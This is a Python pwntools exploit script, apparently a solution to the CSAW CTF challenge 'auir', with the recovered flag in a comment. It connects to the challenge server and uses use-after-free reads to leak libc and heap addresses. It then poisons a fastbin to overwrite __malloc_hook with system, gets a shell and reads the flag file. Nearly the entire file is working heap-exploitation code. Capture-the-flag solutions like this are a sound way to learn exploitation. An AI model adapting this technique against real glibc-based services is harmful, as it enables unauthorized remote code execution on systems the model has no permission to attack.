#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *
import os

# flag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}

#myenv = os.environ.copy()
#myenv['LD_PRELOAD'] = './libc-2.23.so'

e = ELF('auir')
l = ELF('./libc-2.23.so')

#y = process( './auir' , env = myenv )
#print util.proc.pidof(y)

host , port = 'pwn.chal.csaw.io' ,  7713
y = remote( host , port )


def alloc( size , data ):
    y.sendlineafter( '>>' , '1' )
    y.sendlineafter( '>>' , str( size ) )
    y.sendafter( '>>' , data )

def free( idx ):
    y.sendlineafter( '>>' , '2' )
    y.sendlineafter( '>>' , str( idx ) )

def mod( idx , size , data ):
    y.sendlineafter( '>>' , '3' )
    y.sendlineafter( '>>' , str( idx ) )
    y.sendlineafter( '>>' , str( size ) )
    y.sendafter( '>>' , data )

def show( idx ):
    y.sendlineafter( '>>' , '4' )
    y.sendlineafter( '>>' , str( idx ) )


alloc( 500 , 'sh\x00' )
alloc( 500 , 'b' * 500)
alloc( 0x28 , 'c' * 0x28 )
alloc( 0x28 , 'c' * 0x28 )
alloc( 0x28 , 'c' * 0x28 )

free( 1 )
free( 3 )
free( 2 )
show( 1 )

y.recvline()
l.address += u64( y.recv(7).ljust( 8 , '\x00' ) ) - 0x3c4b78
log.success( 'libc -> {}'.format( hex( l.address ) ) )
log.success( '__malloc_hook -> {}'.format( hex( l.symbols['__malloc_hook'] ) ) )
log.success( '__free_hook -> {}'.format( hex( l.symbols['__free_hook'] ) ) )

show( 2 )
y.recvline()
heap = u64( y.recv(7).ljust( 8 , '\x00' ) ) - 0x420
log.success( 'heap -> {}'.format( hex( heap ) ) )


alloc( 0x60 , 'a' )
free( 5 )
mod( 5 , 0x60 , p64( l.symbols['__malloc_hook'] - 0x10 - 0x3 ) )

alloc( 0x60 , 'a' )
alloc( 0x60 , '\x00' * 3 + p64( l.symbols['system'] ) )

y.sendlineafter( '>>' , '1' )
y.sendlineafter( '>>' , str( heap ) )

y.sendline( 'cat /home/`whoami`/flag' )


y.interactive()